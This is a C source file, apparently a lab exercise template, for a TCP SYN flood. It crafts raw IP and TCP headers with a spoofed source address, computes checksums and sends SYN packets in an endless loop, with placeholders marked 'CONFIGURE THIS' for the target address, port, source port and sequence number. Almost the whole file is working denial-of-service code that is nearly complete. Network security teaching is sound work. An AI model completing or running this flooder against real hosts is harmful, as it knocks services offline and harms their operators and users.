#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
//#include <aarch64-linux-gnu/bits/stdlib.h>
#include <time.h>
#include <string.h>
//#include <sys/socket.h>
#include <aarch64-linux-gnu/sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "PacketHeader.h"

/*************************************************************
  Given an IP packet, send it out using a raw socket.
**************************************************************/
void send_raw_ip_packet(struct ipheader2* ip)
{
    
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    //printf("\nSocket is:%d", sock);
    
    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                     &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    ssize_t result = sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    
    //printf("\nPacket is:%ld", result);
    
    close(sock);
}

/*************************************************************
  Checksum
**************************************************************/
unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   /* treat the odd byte at the end, if any */
   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
   sum += (sum >> 16);                  // add carry
   return (unsigned short)(~sum);
}

/****************************************************************
  TCP checksum is calculated on the pseudo header, which includes
  the TCP header and data, plus some part of the IP header.
  Therefore, we need to construct the pseudo header first.
*****************************************************************/
unsigned short calculate_tcp_checksum(struct ipheader2 *ip)
{
   struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +
                            sizeof(struct ipheader2));

   int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader2);

   /* pseudo tcp header for the checksum computation */
   struct pseudo_tcp p_tcp;
   memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

   p_tcp.saddr  = ip->iph_sourceip.s_addr;
   p_tcp.daddr  = ip->iph_destip.s_addr;
   p_tcp.mbz    = 0;
   p_tcp.ptcl   = IPPROTO_TCP;
   p_tcp.tcpl   = htons(tcp_len);
   memcpy(&p_tcp.tcp, tcp, tcp_len);

   return  (unsigned short) in_cksum((unsigned short *)&p_tcp,
                                     tcp_len + 12);
}

/******************************************
 CHANGE THIS DEFINITIONS
*******************************************/
#define DEST_IP "0" // CONFIGURE THIS
#define DEST_PORT 0 // CONFIGURE THIS
#define PACKET_LEN 1500


/******************************************************************
 * Spoof a TCP SYN packet.
 * *******************************************************************/
int main() {
	char buffer[PACKET_LEN];
	struct ipheader2 *ip = (struct ipheader2 *) buffer;
	struct tcpheader *tcp = (struct tcpheader *) (buffer +
			sizeof(struct ipheader2));
	
	srand(time(0)); // Initialize the seed for random # generation.
		
	
	while (1) {

		/*********************************************************
		Write CODE to ensure you send packets from a difference sourceip, 
		  and tcp_sport in every run
		*********************************************************/

		memset(buffer, 0, PACKET_LEN);
		/*********************************************************
		* 		Step 1: Fill in the TCP header.
		********************************************************/
		tcp->tcp_sport = // CONFIGURE THIS
		tcp->tcp_dport = htons(DEST_PORT);
		tcp->tcp_seq = // CONFIGURE THIS
		tcp->tcp_offx2 = 0x50;
		tcp->tcp_flags = TH_SYN; // Enable the SYN bit
		tcp->tcp_win = htons(20000);
		tcp->tcp_sum = 0;

		/*********************************************************
		 * 		Step 2: Fill in the IP header.
		 *********************************************************/
		ip->iph_ver = 4; // Version (IPV4)
		ip->iph_ihl = 5; // Header length
		ip->iph_ttl = 50; // Time to live
		ip->iph_sourceip.s_addr = inet_addr("172.17.0.2"); // CONFIGURE THIS
		ip->iph_destip.s_addr = inet_addr(DEST_IP);
		ip->iph_protocol = IPPROTO_TCP; // The value is 6.
		ip->iph_len = htons(sizeof(struct ipheader) +
				sizeof(struct tcpheader));
		
		// Calculate tcp checksum
		tcp->tcp_sum = calculate_tcp_checksum(ip);
		
		/*********************************************************		
		  Step 3: Finally, send the spoofed packet
		********************************************************/
		send_raw_ip_packet(ip);

	}

	return 0;
}
